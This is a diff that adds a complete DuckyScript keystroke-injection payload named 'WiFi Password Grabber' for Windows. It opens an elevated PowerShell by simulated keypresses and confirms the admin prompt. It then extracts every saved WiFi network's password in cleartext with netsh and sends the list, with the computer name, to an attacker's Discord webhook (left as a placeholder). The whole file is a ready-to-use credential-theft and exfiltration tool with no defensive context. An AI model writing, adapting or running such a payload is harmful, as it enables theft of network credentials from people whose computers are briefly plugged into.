@@ -1,0 +1,45 @@
+REM Title: WiFi Password Grabber
+REM Author: Angrido
+REM Target: Windows
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+DELAY 500
+ENTER
+
+STRING $message = "WiFi Passwords:"
+ENTER
+
+STRING $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Contenuto chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ WIFI_NAME=$name;PASSWORD=$pass }}
+ENTER
+
+STRING foreach ($profile in $wifiProfiles) {
+ENTER
+STRING     $message += "SSID: $($profile.WIFI_NAME) - Password: $($profile.PASSWORD) "
+ENTER
+STRING }
+
+STRING $Body = @{
+ENTER
+STRING     'username' = $env:COMPUTERNAME
+ENTER
+STRING     'content' = $message
+ENTER
+STRING }
+ENTER
+
+STRING $webhook = "YOUR_DISCORD_WEBHOOK"
+ENTER
+
+STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json)
+ENTER
+
+STRING exit
+ENTER
